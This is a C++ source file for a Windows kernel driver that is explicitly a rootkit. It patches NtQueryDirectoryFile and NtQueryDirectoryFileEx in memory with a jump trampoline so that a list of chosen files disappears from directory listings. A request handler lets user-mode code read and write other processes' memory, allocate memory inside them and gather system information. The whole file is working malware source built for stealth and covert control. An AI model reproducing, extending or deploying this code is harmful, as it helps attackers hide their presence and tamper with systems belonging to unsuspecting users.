#include "hooking.h"
#include "HookingGlobals.h"
#pragma warning(disable : 4996)


void ShrootUnload(PDRIVER_OBJECT DriverObject) {
	UNICODE_STRING QueryUnicode = { 0 };
	PVOID OriginalQueryDirFile = NULL;

	UNREFERENCED_PARAMETER(DriverObject);


	// Find NtQueryDirectoryFile base and unhook it:
	RtlInitUnicodeString(&QueryUnicode, L"NtQueryDirectoryFile");
	OriginalQueryDirFile = MmGetSystemRoutineAddress(&QueryUnicode);
	if (OriginalQueryDirFile != NULL) {
		WriteToReadOnlyMemoryMEM(OriginalQueryDirFile, OriginalNtQueryDirFile, sizeof(DEFAULT_SHELLCODE), TRUE);
	}
}


NTSTATUS roothook::SystemFunctionHook(PVOID HookingFunction, const char* ModuleName, const char* RoutineName, BOOL ToSave, ULONG Tag) {
	/*
	Example call for driver function:    roothook::KernelFunctionHook(&roothook::HookHandler, "\\SystemRoot\\System32\\drivers\\dxgkrnl.sys", "NtQueryCompositionSurfaceStatistics", NULL);
	Example call for kernel function:    roothook::KernelFunctionHook(&roothook::EvilQueryDirectoryFile, NULL, "NtQueryDirectoryFile", NULL);
	*/
	PVOID* SaveBuffer = NULL;
	ULONG64 ReplacementValue = 0;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	UNICODE_STRING TargetName = { 0 };
	ANSI_STRING AnsiTargetName = { 0 };
	PVOID TargetFunction = NULL;
	BYTE ShellCode[] = { 0x51,  // push rcx
	0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs rcx, ReplacementFunc (64 bit value of address)
	0x48, 0x87, 0x0C, 0x24,  // xchg QWORD PTR [rsp], rcx  (put 64 bit address instead of original rcx in stack)
	0xC3 };  // ret (jump to rcx value - the value of ReplacementFunc)


	// Check for invalid parameters:
	if (HookingFunction == NULL) {
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
		DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (HookingFunction = NULL)\n");
		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
		return STATUS_INVALID_PARAMETER;
	}

	
	// Get the address of the target function:
	if (ModuleName == NULL) {
		RtlInitAnsiString(&AnsiTargetName, RoutineName);
		Status = RtlAnsiStringToUnicodeString(&TargetName, &AnsiTargetName, TRUE);
		if (!NT_SUCCESS(Status)) {
			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
			DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (cannot get RoutineName in UNICODE_STRING format: 0x%x)\n", Status);
			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
			return STATUS_UNSUCCESSFUL;
		}
		TargetFunction = MmGetSystemRoutineAddress(&TargetName);
		if (TargetFunction == NULL) {
			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
			DbgPrintEx(0, 0, "KMDFdriver Hooking - Kernel function hook failed (cannot get address of kernel function)\n");
			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
			return STATUS_INVALID_ADDRESS;
		}
	}
	else {
		TargetFunction = SystemModuleExportMEM(ModuleName, RoutineName);
		if (TargetFunction == NULL) {
			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
			DbgPrintEx(0, 0, "KMDFdriver Hooking - Driver function hook failed (failed getting the driver function base address)\n");
			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
			return STATUS_INVALID_ADDRESS;
		}
	}


	// Save the original sizeof(ShellCode) bytes in buffer for later use in repairing it:	
	if (ToSave) {
		switch (Tag) {
		case 'HkQr': SaveBuffer = &OriginalNtQueryDirFile; break;
		case 'HkQx': SaveBuffer = &OriginalNtQueryDirFileEx; break;
		case 'HkCf': SaveBuffer = &OriginalNtCreateFile; break;
		default: return STATUS_INVALID_PARAMETER;
		}
		*SaveBuffer = ExAllocatePoolWithTag(NonPagedPool, sizeof(ShellCode), Tag);
		if (*SaveBuffer == NULL) {
			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
			DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (failed to save original content that will be replaced by hook - cannot allocate saving buffer)\n");
			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
			return STATUS_MEMORY_NOT_ALLOCATED;
		}
		if (!WriteToReadOnlyMemoryMEM(*SaveBuffer, TargetFunction, sizeof(ShellCode), FALSE)) {
			DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
			DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (failed to save original content that will be replaced by hook)\n");
			DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
			if (*SaveBuffer != NULL) {
				ExFreePool(*SaveBuffer);
			}
			return STATUS_UNSUCCESSFUL;
		}
	}


	// Prepare the shellcode for deployment and write it into memory:
	ReplacementValue = (ULONG64)HookingFunction;
	RtlCopyMemory(&ShellCode[3], &ReplacementValue, sizeof(PVOID));
	if (!WriteToReadOnlyMemoryMEM(TargetFunction, &ShellCode, sizeof(ShellCode), TRUE)) {
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=HOOK LOG=-=-=-=-=-\n\n");
		DbgPrintEx(0, 0, "KMDFdriver Hooking - System function hook failed (failed to patch the original system function)\n");
		DbgPrintEx(0, 0, "\n-=-=-=-=-=HOOK ENDED=-=-=-=-=-\n\n");
		if (SaveBuffer != NULL && *SaveBuffer != NULL) {
			ExFreePool(*SaveBuffer);
		}
		return STATUS_UNSUCCESSFUL;
	}
	return STATUS_SUCCESS;
}


NTSTATUS roothook::SystemServiceDTHook() {
	return STATUS_SUCCESS;
}


NTSTATUS roothook::InterruptDTHook() {
	return STATUS_SUCCESS;
}


NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
	DbgPrintEx(0, 0, "\n\n-=-=-=-=-=REQUEST LOG=-=-=-=-=-\n\n");
	DbgPrintEx(0, 0, "KMDFdriver HOOOOOKHANDLER (highest UM address = %p)\n", (PVOID)general::GetHighestUserModeAddrADD());

	ROOTKIT_MEMORY* RootkInstructions = (ROOTKIT_MEMORY*)hookedf_params;
	NTSTATUS Return = STATUS_SUCCESS;

	RootkInstructions->IsFlexible = FALSE;  // verify that operation was made and the transforming of data KM-UM
	switch (RootkInstructions->Operation) {
	case RKOP_MDLBASE:
		// Request process module address -

		DbgPrintEx(0, 0, "Request Type: get base address of module\n");
		Return = GetModuleBaseRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;


	case RKOP_WRITE:
		// Copy into memory -

		DbgPrintEx(0, 0, "Request Type: write data into memory\n");
		Return = WriteToMemoryRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;


	case RKOP_READ:
		// Read from memory -

		DbgPrintEx(0, 0, "Request Type: read data from memory\n");
		Return = ReadFromMemoryRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;


	case RKOP_SYSINFO:
		// get system information/s by request -

		DbgPrintEx(0, 0, "Request Type: get information about target system\n");
		Return = RetrieveSystemInformationRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;


	case RKOP_PRCMALLOC:
		// allocate specified memory in specified process -

		DbgPrintEx(0, 0, "Request Type: allocate memory in the virtual address space of a process\n");
		Return = AllocSpecificMemoryRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;
	}
	return STATUS_SUCCESS;
}


NTSTATUS roothook::EvilQueryDirectoryFile(IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG FileInformationLength,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN ReturnSingleEntry,
	IN PUNICODE_STRING FileName OPTIONAL,
	IN BOOLEAN RestartScan) {
	UNICODE_STRING QueryUnicode = { 0 };

	UNICODE_STRING RequestedDir = { 0 };
	UNICODE_STRING CurrDirName = { 0 };
	UNICODE_STRING ActualDirName = { 0 };

	UNICODE_STRING CurrFileName = { 0 };
	UNICODE_STRING ActualFileName = { 0 };

	PVOID DirectoryInfo = NULL;
	IO_STATUS_BLOCK DirStatus = { 0 };
	PVOID OriginalQueryDirFile = NULL;
	QueryDirFile OgNtQueryDirectoryFile = NULL;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;


	// Find NtQueryDirectoryFile base:
	RtlInitUnicodeString(&QueryUnicode, L"NtQueryDirectoryFile");
	OriginalQueryDirFile = MmGetSystemRoutineAddress(&QueryUnicode);
	if (OriginalQueryDirFile == NULL) {
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
		DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile failed (cannot get address of original NtQueryDirectoryFile)\n");
		DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
		return STATUS_UNSUCCESSFUL;
	}


	// Unhook NtQueryDirectoryFile:
	if (!WriteToReadOnlyMemoryMEM(OriginalQueryDirFile, OriginalNtQueryDirFile, sizeof(DEFAULT_SHELLCODE), TRUE)) {
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
		DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile failed (cannot unhook original NtQueryDirectoryFile), unhook data: %p\n", OriginalNtQueryDirFile);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
		return STATUS_UNSUCCESSFUL;
	}


	// Call original NtQueryDirectoryFile and re-hook it:
	OgNtQueryDirectoryFile = (QueryDirFile)OriginalQueryDirFile;
	Status = OgNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
								FileInformationLength, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
	if (!NT_SUCCESS(roothook::SystemFunctionHook(&roothook::EvilQueryDirectoryFile, NULL, "NtQueryDirectoryFile", FALSE, 'HkQr'))) {
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
		DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile failed (cannot rehook NtQueryDirectoryFile)\n");
		DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
		return STATUS_UNSUCCESSFUL;
	}
	if (!NT_SUCCESS(Status)){
		//DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
		//DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile: actual NtQueryDirectoryFile failed with 0x%x\n", Status);
		//DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
		return Status;
	}


	// Make sure that if its a specific search (FileName != NULL), its still ignored:
	if (FileName != NULL && FileName->Buffer != NULL) {
		if (NT_SUCCESS(general::CopyStringAfterCharADD(FileName, &ActualFileName, '\\'))) {
			DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile, FileName exists: %wZ, shortened: %wZ\n", FileName, ActualFileName);
			for (int SearchFileObj = 0; SearchFileObj < sizeof(DefaultFileObjs) / sizeof(const WCHAR*); SearchFileObj++) {
				RtlInitUnicodeString(&CurrFileName, DefaultFileObjs[SearchFileObj]);
				if (general::CompareUnicodeStringsADD(&CurrFileName, &ActualFileName, 0)) {
					FileInformation = NULL;
					IoStatusBlock->Information = NULL;
					IoStatusBlock->Status = STATUS_NO_SUCH_FILE;
					if (ActualFileName.Buffer != NULL) {
						ExFreePool(ActualFileName.Buffer);
					}
					DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile, hiding file/directory %wZ\n", FileName);
					return STATUS_NO_SUCH_FILE;
				}
			}
			if (ActualFileName.Buffer != NULL) {
				ExFreePool(ActualFileName.Buffer);
			}
		}
	}


	if (FileInformationClass == FileIdBothDirectoryInformation || FileInformationClass == FileBothDirectoryInformation) {
		// Check if queried directory is on the path/s / partly on the path/s that i want to hide by default:
		DirectoryInfo = ExAllocatePoolWithTag(NonPagedPool, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), 'RkFr');
		if (DirectoryInfo == NULL) {
			return STATUS_SUCCESS;
		}
		Status = ZwQueryInformationFile(FileHandle, &DirStatus, DirectoryInfo, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), FileNameInformation);
		if (!NT_SUCCESS(Status)) {
			ExFreePool(DirectoryInfo);
			return STATUS_SUCCESS;
		}
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
		RtlInitUnicodeString(&RequestedDir, ((PFILE_NAME_INFORMATION)DirectoryInfo)->FileName);
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
		if (NT_SUCCESS(general::CopyStringAfterCharADD(&RequestedDir, &ActualDirName, '\\'))) {
			DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile: %wZ, shortened: %wZ\n", RequestedDir, ActualDirName);
			for (int SearchDir = 0; SearchDir < sizeof(DefaultFileObjs) / sizeof(const WCHAR*); SearchDir++) {
				RtlInitUnicodeString(&CurrDirName, DefaultFileObjs[SearchDir]);
				if (general::CompareUnicodeStringsADD(&CurrDirName, &ActualDirName, 0)) {
					FileInformation = NULL;
					IoStatusBlock->Information = NULL;
					IoStatusBlock->Status = STATUS_NO_SUCH_FILE;
					if (ActualDirName.Buffer != NULL) {
						ExFreePool(ActualDirName.Buffer);
					}
					ExFreePool(DirectoryInfo);
					DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
					return STATUS_NO_SUCH_FILE;
				}
			}
			if (ActualDirName.Buffer != NULL) {
				ExFreePool(ActualDirName.Buffer);
			}
		}
		else {
			DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFile: %wZ\n", RequestedDir);
		}
		ExFreePool(DirectoryInfo);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
	}
	return STATUS_SUCCESS;
}


NTSTATUS roothook::EvilQueryDirectoryFileEx(IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	IN ULONG QueryFlags,
	IN PUNICODE_STRING FileName OPTIONAL) {
	UNICODE_STRING QueryUnicode = { 0 };
	UNICODE_STRING ObjectName = { 0 };
	UNICODE_STRING CurrSearchName = { 0 };
	UNICODE_STRING CurrSearchObj = { 0 };
	PFILE_NAME_INFORMATION ObjectInfo = NULL;
	IO_STATUS_BLOCK ObjectStatus = { 0 };
	PVOID OriginalQueryDirFileEx = NULL;
	QueryDirFileEx OgNtQueryDirectoryFileEx = NULL;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;


	// Find NtQueryDirectoryFile base:
	RtlInitUnicodeString(&QueryUnicode, L"NtQueryDirectoryFileEx");
	OriginalQueryDirFileEx = MmGetSystemRoutineAddress(&QueryUnicode);
	if (OriginalQueryDirFileEx == NULL) {
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
		DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFileEx failed (cannot get address of original NtQueryDirectoryFileEx)\n");
		DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
		return STATUS_UNSUCCESSFUL;
	}


	// Unhook NtQueryDirectoryFileEx:
	if (!WriteToReadOnlyMemoryMEM(OriginalQueryDirFileEx, OriginalNtQueryDirFileEx, sizeof(DEFAULT_SHELLCODE), TRUE)) {
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
		DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFileEx failed (cannot unhook original NtQueryDirectoryFileEx)\n");
		DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
		return STATUS_UNSUCCESSFUL;
	}


	// Call original NtQueryDirectoryFileEx and re-hook it:
	OgNtQueryDirectoryFileEx = (QueryDirFileEx)OriginalQueryDirFileEx;
	Status = OgNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation,
		Length, FileInformationClass, QueryFlags, FileName);
	if (!NT_SUCCESS(roothook::SystemFunctionHook(&roothook::EvilQueryDirectoryFileEx, NULL, "NtQueryDirectoryFileEx", FALSE, 'HkQx'))) {
		DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
		DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFileEx failed (cannot rehook NtQueryDirectoryFileEx)\n");
		DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
		return STATUS_UNSUCCESSFUL;
	}
	if (!NT_SUCCESS(Status)) {
		//DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
		//DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFileEx: actual NtQueryDirectoryFileEx failed with 0x%x\n", Status);
		//DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
		return Status;
	}


	// Check if queried directory is on the path/s / partly on the path/s that i want to hide by default:
	ObjectInfo = (PFILE_NAME_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), 'RkFx');
	if (ObjectInfo == NULL) {
		return STATUS_SUCCESS;
	}
	Status = ZwQueryInformationFile(FileHandle, &ObjectStatus, &ObjectInfo, sizeof(FILE_NAME_INFORMATION) + (MAX_PATH - 1), FileNameInformation);
	if (!NT_SUCCESS(Status)) {
		ExFreePool(ObjectInfo);
		return STATUS_SUCCESS;
	}
	RtlInitUnicodeString(&ObjectName, ObjectInfo->FileName);
	for (int SearchDir = 0; SearchDir < sizeof(DefaultFileObjs) / sizeof(const WCHAR*); SearchDir++) {
		RtlInitUnicodeString(&CurrSearchName, DefaultFileObjs[SearchDir]);
		if (general::IsExistFromIndexADD(&CurrSearchName, &ObjectName, 0)) {
			FileInformation = NULL;
			IoStatusBlock->Information = NULL;
			IoStatusBlock->Status = STATUS_NO_SUCH_FILE;
			ExFreePool(ObjectInfo);
			RtlFreeUnicodeString(&CurrSearchName);
			return STATUS_NO_SUCH_FILE;
		}
		RtlFreeUnicodeString(&CurrSearchName);
	}


	// Make sure that if its a specific search (FileName != NULL), its still ignored:
	if (FileName != NULL) {
		for (int SearchFileObj = 0; SearchFileObj < sizeof(DefaultFileObjs) / sizeof(const WCHAR*); SearchFileObj++) {
			RtlInitUnicodeString(&CurrSearchObj, DefaultFileObjs[SearchFileObj]);
			if (general::CompareUnicodeStringsADD(&CurrSearchObj, FileName, 0)) {
				FileInformation = NULL;
				IoStatusBlock->Information = NULL;
				IoStatusBlock->Status = STATUS_NO_SUCH_FILE;
				ExFreePool(ObjectInfo);
				RtlFreeUnicodeString(&CurrSearchObj);
				return STATUS_NO_SUCH_FILE;
			}
			RtlFreeUnicodeString(&CurrSearchObj);
		}
	}
	DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
	DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake NtQueryDirectoryFileEx: %wZ\n", ObjectName);
	DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
	ExFreePool(ObjectInfo);
	return STATUS_SUCCESS;
}